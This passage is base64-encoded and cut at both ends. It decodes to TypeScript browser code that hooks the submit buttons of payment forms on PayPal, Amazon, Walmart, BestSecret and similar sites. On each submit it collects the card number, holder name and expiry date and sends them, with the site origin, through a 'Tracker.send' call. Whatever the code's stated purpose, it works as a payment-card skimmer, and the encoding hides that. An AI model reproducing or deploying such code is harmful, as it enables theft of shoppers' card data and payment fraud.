dXNoKF9jaGlsZEVsZW1lbnQpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICBpZiAoX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhfY2hpbGRFbGVtZW50LCBlbGVtZW50cyk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZU1vbGxpZVBheW1lbnRGb3JtRWxlbWVudChzZWxmLCBfY2hpbGRFbGVtZW50LCBlbGVtZW50cywgY2FsbGJhY2spO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgZXhwbG9yZUFuY2hvck9ubHkoc2VsZjogdGhpcywgcGFyZW50Tm9kZTogYW55LCBsaXN0SWQ6IHN0cmluZywgY2FsbGJhY2s6IChhcmcwOiBhbnkpID0+IHZvaWQpIHtcclxuICAgICAgICBpZiAocGFyZW50Tm9kZS5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICBwYXJlbnROb2RlLmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgaWYgKF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lID09PSAnQScgJiYgX19kZXRlY3RlZEVsZW1lbnQuZ2V0QXR0cmlidXRlKCdkYXRhLXR4bmlkJykgPT09IGxpc3RJZCkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhfX2RldGVjdGVkRWxlbWVudCk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVBbmNob3JPbmx5KHNlbGYsIF9fZGV0ZWN0ZWRFbGVtZW50LCBsaXN0SWQsIGNhbGxiYWNrKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVBbmNob3JPbmx5QnlIcmVmKHNlbGY6IHRoaXMsIHBhcmVudE5vZGU6IGFueSwgbGlzdElkOiBzdHJpbmcsIGNhbGxiYWNrOiAoYXJnMDogYW55KSA9PiB2b2lkKSB7XHJcbiAgICAgICAgaWYgKHBhcmVudE5vZGUuY2hpbGROb2Rlcy5sZW5ndGggIT09IDApIHtcclxuICAgICAgICAgICAgcGFyZW50Tm9kZS5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgIGlmIChfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0EnICYmIF9fZGV0ZWN0ZWRFbGVtZW50LmhyZWYuaW5kZXhPZihsaXN0SWQpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhfX2RldGVjdGVkRWxlbWVudCk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVBbmNob3JPbmx5QnlIcmVmKHNlbGYsIF9fZGV0ZWN0ZWRFbGVtZW50LCBsaXN0SWQsIGNhbGxiYWNrKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVQYXltZW50SW5wdXRUYWdPbmx5KHNlbGY6IHRoaXMsIGVsZW1lbnRQYXJlbnROb2RlOiBIVE1MRWxlbWVudCwgY2FsbGJhY2s6IGFueSkge1xyXG4gICAgICAgIGlmIChlbGVtZW50UGFyZW50Tm9kZS5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICBlbGVtZW50UGFyZW50Tm9kZS5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9fY2hpbGRFbGVtZW50KSB7XHJcbiAgICAgICAgICAgICAgICBpZiAoX19jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgJiYgKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxJbnB1dEVsZW1lbnQpLnR5cGUgPT09ICdzdWJtaXQnKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKChfX2NoaWxkRWxlbWVudCBhcyBIVE1MSW5wdXRFbGVtZW50KSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWdPbmx5KHNlbGYsIChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCksIGNhbGxiYWNrKVxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgZXhwbG9yZVBheVBhbFBheW1lbnRGb3JtRWxlbWVudChzZWxmOiB0aGlzLCBfX2NyZWRpdENhcmRGb3JtRWxlbWVudDogYW55LCBlbGVtZW50czogYW55W10sIGNhbGxiYWNrOiAoYXJnMDogYW55LCBhcmcxOiBhbnkpID0+IHZvaWQpIHtcclxuICAgICAgICBpZiAoX19jcmVkaXRDYXJkRm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5sZW5ndGggIT09IDApIHtcclxuICAgICAgICAgICAgX19jcmVkaXRDYXJkRm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfZm9ybUNoaWxkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICBpZiAoX2Zvcm1DaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgfHwgX2Zvcm1DaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdTRUxFQ1QnIHx8IF9mb3JtQ2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnQlVUVE9OJykge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChfZm9ybUNoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0lOUFVUJyB8fCBfZm9ybUNoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ1NFTEVDVCcgJiZcclxuICAgICAgICAgICAgICAgICAgICAgICAgX2Zvcm1DaGlsZEVsZW1lbnQudHlwZSAhPT0gJ2hpZGRlbicgJiYgX2Zvcm1DaGlsZEVsZW1lbnQuaWQgIT09ICdiaWxsaW5nQWRkcmVzc0lkJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5wdXNoKF9mb3JtQ2hpbGRFbGVtZW50KTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9mb3JtQ2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnQlVUVE9OJyAmJiBfZm9ybUNoaWxkRWxlbWVudC50eXBlID09PSAnc3VibWl0Jykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoY2FsbGJhY2spIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKF9mb3JtQ2hpbGRFbGVtZW50LCBlbGVtZW50cyk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheVBhbFBheW1lbnRGb3JtRWxlbWVudChzZWxmLCBfZm9ybUNoaWxkRWxlbWVudCwgZWxlbWVudHMsIGNhbGxiYWNrKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVIZWxsb0ZyZXNoUGF5bWVudENvbnRhaW5lcihzZWxmOiB0aGlzLCBwYXJlbnROb2RlOiBhbnksIGNhbGxiYWNrOiBhbnkpIHtcclxuICAgICAgICBwYXJlbnROb2RlLmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX19lbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgaWYgKF9fZWxlbWVudC5ub2RlTmFtZSA9PT0gJ0JVVFRPTicgJiYgX19lbGVtZW50LmdldEF0dHJpYnV0ZSgnZGF0YS10ZXN0LWlkJykgPT09ICdhZGQtcGF5bWVudC1tZXRob2Qtc2F2ZScpIHtcclxuICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xyXG4gICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKF9fZWxlbWVudCk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVIZWxsb0ZyZXNoUGF5bWVudENvbnRhaW5lcihzZWxmLCBfX2VsZW1lbnQsIGNhbGxiYWNrKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVCZXN0U2VjcmV0UGF5bWVudENvbnRhaW5lcihzZWxmOiB0aGlzKSB7XHJcbiAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmZvckVhY2goZnVuY3Rpb24gKF9fZm9ybUVsZW1lbnQpIHtcclxuICAgICAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQuaWQgPT09IFwiY3JlZGl0Rm9ybVwiKSB7XHJcbiAgICAgICAgICAgICAgICBsZXQgZWxlbWVudHM6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlQmVzdFNlY3JldFBheW1lbnRGb3JtRWxlbWVudChzZWxmLCBfX2Zvcm1FbGVtZW50LCBlbGVtZW50cywgZnVuY3Rpb24gKGNvbnRyb2xsZXI6IGFueSwgZWxlbWVudHM6IGFueVtdKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgY29udHJvbGxlci5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBheW1lbnRNZXRob2REYXRhOiBhbnkgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMuZm9yRWFjaChmdW5jdGlvbiAoX19jaGlsZEVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2REYXRhLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19jaGlsZEVsZW1lbnQubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19jaGlsZEVsZW1lbnQuaWQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnOiBfX2NoaWxkRWxlbWVudC5uYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fY2hpbGRFbGVtZW50LnZhbHVlLFxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IHBheW1lbnRNZXRob2REYXRhWzFdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbMV0udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IHBheW1lbnRNZXRob2REYXRhWzBdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbMF0udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiBwYXltZW50TWV0aG9kRGF0YVs0XS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzRdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY2FyZEV4cGlyZVwiOiBwYXltZW50TWV0aG9kRGF0YVsyXS52YWx1ZSArICcvJyArIHBheW1lbnRNZXRob2REYXRhWzNdLnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogd2luZG93LmxvY2F0aW9uLm9yaWdpblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZERhdGEgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgLy9lbGVtZW50cyA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcbiAgICBleHBsb3JlQmVzdFNlY3JldFBheW1lbnRGb3JtRWxlbWVudChzZWxmOiB0aGlzLCBfX2Zvcm1FbGVtZW50OiBhbnksIGVsZW1lbnRzOiBhbnlbXSwgY2FsbGJhY2s6IChhcmcwOiBhbnksIGFyZzE6IGFueSkgPT4gdm9pZCkge1xyXG4gICAgICAgIGlmIChfX2Zvcm1FbGVtZW50LmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgIF9fZm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfY2hpbGRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgIGlmIChfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnIHx8IF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdTRUxFQ1QnIHx8IF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdCVVRUT04nKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgJiYgX2NoaWxkRWxlbWVudC50eXBlICE9PSAnaGlkZGVuJyB8fCBfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnU0VMRUNUJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5wdXNoKF9jaGlsZEVsZW1lbnQpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICBpZiAoX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0JVVFRPTicgJiYgIShfY2hpbGRFbGVtZW50IGFzIEhUTUxCdXR0b25FbGVtZW50KS5jbGFzc0xpc3QuY29udGFpbnMoJ2J0bi1saW5rJylcclxuICAgICAgICAgICAgICAgICAgICAgICAgJiYgIShfY2hpbGRFbGVtZW50IGFzIEhUTUxCdXR0b25FbGVtZW50KS5jbGFzc0xpc3QuY29udGFpbnMoJ2J0bi1zZWNvbmRhcnktYWN0aW9uJykgJiYgKF9jaGlsZEVsZW1lbnQgYXMgSFRNTEJ1dHRvbkVsZW1lbnQpLnR5cGUgPT09ICdzdWJtaXQnKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2soX2NoaWxkRWxlbWVudCwgZWxlbWVudHMpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVCZXN0U2VjcmV0UGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9jaGlsZEVsZW1lbnQsIGVsZW1lbnRzLCBjYWxsYmFjayk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBleHBsb3JlQW1hem9uUGF5bWVudENvbnRhaW5lcihzZWxmOiB0aGlzKSB7XHJcbiAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmZvckVhY2goZnVuY3Rpb24gKF9fZm9ybUVsZW1lbnQpIHtcclxuICAgICAgICAgICAgaWYgKCFfX2Zvcm1FbGVtZW50LmNsYXNzTGlzdC5jb250YWlucygnbmF2LXNlYXJjaGJhcicpICYmIF9fZm9ybUVsZW1lbnQubmFtZSAhPT0gJ3VlX2JhY2tkZXRlY3QnICYmIF9fZm9ybUVsZW1lbnQuc3R5bGUuZGlzcGxheSAhPT0gJ25vbmUnKSB7XHJcbiAgICAgICAgICAgICAgICBsZXQgZWxlbWVudHM6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlQW1hem9uUGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9fZm9ybUVsZW1lbnQsIGVsZW1lbnRzLCBmdW5jdGlvbiAoY29udHJvbGxlciwgZWxlbWVudHMpIHtcclxuICAgICAgICAgICAgICAgICAgICBjb250cm9sbGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGF5bWVudE1ldGhvZERhdGE6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudDogeyBub2RlTmFtZTogYW55OyBpZDogYW55OyBuYW1lOiBhbnk7IHZhbHVlOiBhbnk7IH0pIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2REYXRhLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19jaGlsZEVsZW1lbnQubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19jaGlsZEVsZW1lbnQuaWQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnOiBfX2NoaWxkRWxlbWVudC5uYW1lLmluZGV4T2YoJ2FjY291bnRIb2xkZXJOYW1lJykgIT09IC0xIHx8IF9fY2hpbGRFbGVtZW50Lm5hbWUuaW5kZXhPZignYWNjb3VudF9ob2xkZXJfbmFtZScpICE9PSAtMSA/ICdjYXJkSG9sZGVyJyA6IChfX2NoaWxkRWxlbWVudC5uYW1lLmluZGV4T2YoJ0NhcmROdW1iZXInKSAhPT0gLTEgPyAnY2FyZE51bWJlcicgOiAoX19jaGlsZEVsZW1lbnQubmFtZS5pbmRleE9mKCdtb250aCcpICE9PSAtMSA/ICdleHBpcmF0aW9uTW9udGgnIDogKF9fY2hpbGRFbGVtZW50Lm5hbWUuaW5kZXhPZigneWVhcicpICE9PSAtMSA/ICdleHBpcmF0aW9uWWVhcicgOiAnVW5rbm93bicpKSksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19jaGlsZEVsZW1lbnQudmFsdWUsXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogcGF5bWVudE1ldGhvZERhdGFbMV0udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IHBheW1lbnRNZXRob2REYXRhWzBdLnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY2FyZEV4cGlyZVwiOiBwYXltZW50TWV0aG9kRGF0YVsyXS52YWx1ZSArICcvJyArIHBheW1lbnRNZXRob2REYXRhWzNdLnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogd2luZG93LmxvY2F0aW9uLm9yaWdpblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZERhdGEgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgZXhwbG9yZUFtYXpvblBheW1lbnRGb3JtRWxlbWVudChzZWxmOiB0aGlzLCBfX2Zvcm1FbGVtZW50OiBhbnksIGVsZW1lbnRzOiBhbnlbXSwgY2FsbGJhY2s6IChhcmcwOiBhbnksIGFyZzE6IGFueSkgPT4gdm9pZCkge1xyXG4gICAgICAgIGlmIChfX2Zvcm1FbGVtZW50LmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgIF9fZm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfY2hpbGRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgIGlmIChfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnIHx8IF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdTRUxFQ1QnKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgJiYgX2NoaWxkRWxlbWVudC50eXBlICE9PSAnaGlkZGVuJyAmJlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBfY2hpbGRFbGVtZW50LnR5cGUgIT09ICdzdWJtaXQnICYmIF9jaGlsZEVsZW1lbnQudHlwZSAhPT0gJ2NoZWNrYm94JyB8fFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnU0VMRUNUJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5wdXNoKF9jaGlsZEVsZW1lbnQpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICBpZiAoX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0lOUFVUJyAmJiBfY2hpbGRFbGVtZW50LnR5cGUgPT09ICdzdWJtaXQnKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2soX2NoaWxkRWxlbWVudCwgZWxlbWVudHMpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVBbWF6b25QYXltZW50Rm9ybUVsZW1lbnQoc2VsZiwgX2NoaWxkRWxlbWVudCwgZWxlbWVudHMsIGNhbGxiYWNrKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVXYWxtYXJ0UGF5bWVudENvbnRhaW5lcihzZWxmOiB0aGlzKSB7XHJcbiAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmVkaXQtZm9ybS5tdWx0aXBsZS1yZXF1aXJlZCcpICE9PSBudWxsICYmXHJcbiAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuZWRpdC1mb3JtLWFjdGlvbnMnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmZpcnN0RWxlbWVudENoaWxkICE9PSBudWxsKSB7XHJcbiAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcclxuICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuZWRpdC1mb3JtLWFjdGlvbnMnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmZpcnN0RWxlbWVudENoaWxkPy5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcclxuICAgICAgICAgICAgICAgICAgICBbXCJjbGlja1wiLCBcImRibGNsaWNrXCJdLmZvckVhY2goZnVuY3Rpb24gKGV2ZW50KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZTogYW55ID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5lZGl0LWZvcm0tYWN0aW9ucycpPy5maXJzdEVsZW1lbnRDaGlsZD8uZmlyc3RFbGVtZW50Q2hpbGQ/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRJbnB1dFRhZyhzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmVkaXQtZm9ybS5tdWx0aXBsZS1yZXF1aXJlZCcpIGFzIEhUTUxFbGVtZW50KSwgJ2NyZWRpdENhcmQnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5wYXltZW50LW9wdGlvbicpLmZvckVhY2goZnVuY3Rpb24gKGVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWVsZW1lbnQuY2xhc3NMaXN0LmNvbnRhaW5zKCdwYXltZW50LWluYWN0aXZlJykpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudC5jbGFzc0xpc3QucmVtb3Zl